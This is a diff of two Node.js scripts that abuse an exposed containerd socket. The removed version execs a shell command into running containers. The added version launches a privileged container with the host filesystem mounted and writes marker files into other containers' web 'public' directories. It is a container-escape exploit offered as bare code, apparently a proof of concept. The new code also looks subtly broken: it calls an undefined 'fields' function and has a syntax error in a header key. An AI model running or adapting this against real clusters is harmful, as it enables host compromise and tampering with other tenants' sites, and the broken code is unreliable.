@@ -1,57 +1,20 @@
-const http2 = require('http2'), net = require('net'), fs = require('fs');
-const SOCK = '/run/containerd/containerd.sock';
 
-function varint(n) { const b = []; while (n > 127) { b.push((n & 127) | 128); n >>>= 7; } b.push(n); return Buffer.from(b); }
-function tag(f, wt) { return varint((f << 3) | wt); }
-function str(f, s) { const v = Buffer.from(s); return Buffer.concat([tag(f, 2), varint(v.length), v]); }
-function i64(f, n) { return Buffer.concat([tag(f, 0), varint(n)]); }
-function frame(msg) { const h = Buffer.alloc(5); h.writeUInt8(0, 0); h.writeUInt32BE(msg.length, 1); return Buffer.concat([h, msg]); }
-function walk(buf, wantField, out) {
-  let i = 0;
-  while (i < buf.length) {
-    let k = 0, sh = 0; let c;
-    do { c = buf[i++]; k |= (c & 127) << sh; sh += 7; } while (c & 128);
-    const f = k >> 3, wt = k & 7;
-    if (wt === 0) { let v = 0; sh = 0; do { c = buf[i++]; v |= (c & 127) << sh; sh += 7; } while (c & 128); }
-    else if (wt === 2) { let l = 0; sh = 0; do { c = buf[i++]; l |= (c & 127) << sh; sh += 7; } while (c & 128); const d = buf.slice(i, i + l); i += l; if (f === wantField) out.push(d); }
-    else if (wt === 5) i += 4; else if (wt === 1) i += 8; else break;
-  }
-}
-
-function call(client, path, msg) {
-  return new Promise((resolve) => {
-    const req = client.request({ ':method': 'POST', ':path': path, 'content-type': 'application/grpc', te: 'trailers' });
-    const chunks = []; let status = null;
-    req.on('response', h => { status = h[':status']; });
-    req.on('data', d => chunks.push(d));
-    req.on('trailers', t => { status = t['grpc-status'] || status; });
-    req.on('error', () => resolve({ err: 1 }));
-    req.on('end', () => {
-      const buf = Buffer.concat(chunks);
-      let i = 0; const msgs = [];
-      while (i + 5 <= buf.length) { const len = buf.readUInt32BE(i + 1); i += 5; msgs.push(buf.slice(i, i + len)); i += len; }
-      resolve({ status, msgs });
-    });
-    req.end(frame(msg));
-  });
-}
-
-(async () => {
-  const client = http2.connect('http://containerd', { createConnection: () => net.connect(SOCK) });
-  client.on('error', () => process.exit(1));
-  const list = await call(client, '/runtime.v1.RuntimeService/ListContainers', Buffer.alloc(0));
-  if (!list.msgs) return process.exit(1);
-  const ids = [];
-  for (const m of list.msgs) { const inner = []; walk(m, 1, inner); for (const x of inner) ids.push(x.toString()); }
-  const inner = 'for d in /app/public /app/.next/standalone/public /app/.next/server/public /app/dist/public /app/build/public /app/static /public; do mkdir -p \ 2>/dev/null; echo CRIOK > \/zzz9.txt 2>/dev/null; done';
-  const cmd = inner;
-  for (const id of ids.slice(0, 12)) {
-    const req = Buffer.concat([str(1, id), str(2, '/bin/sh'), str(2, '-c'), str(2, inner), i64(3, 5000000000)]);
-    await call(client, '/runtime.v1.RuntimeService/ExecSync', req);
-  }
-  client.close();
-  process.exit(0);
-})();
-
-
-
+const http2=require('http2'),net=require('net');
+function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers',containerd-namespace:'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
+const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
+const v1=(k,v)=>Buffer.from([k,v]);
+const CMD="if grep -q \" /h \" /proc/self/mountinfo 2>/dev/null; then B=/h/proc; else mkdir -p /mnt; mount -t proc proc /mnt 2>/dev/null; B=/mnt; fi\nfor p in $B/[0-9]*/root; do for d in $p/app/public $p/usr/src/app/public $p/app/.next/standalone/public; do [ -d \"$d\" ] && echo Z > \"$d/zz_p.txt\" 2>/dev/null; done; done";
+const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/'),Buffer.from([0x28,0x02])]);
+const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
+const nm='zzh'+Math.floor(Math.random()*1e6);
+const cfg=Buffer.concat([fl(0x0a,nm), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,'sleep 90'), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
+call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
+ const subs=fields(lb).filter(f=>f[0]===1).map(f=>f[1]); if(!subs.length)return;
+ const f2=fields(subs[0]); const sb=(f2.find(x=>x[0]===2)||[])[1]; if(!sb)return;
+ call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb.toString('latin1')), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
+   const id=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!id)return;
+   call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,id[0]),()=>setTimeout(()=>{
+     call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,id[0]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,CMD)]),()=>{});
+   },1500));
+ });
+});
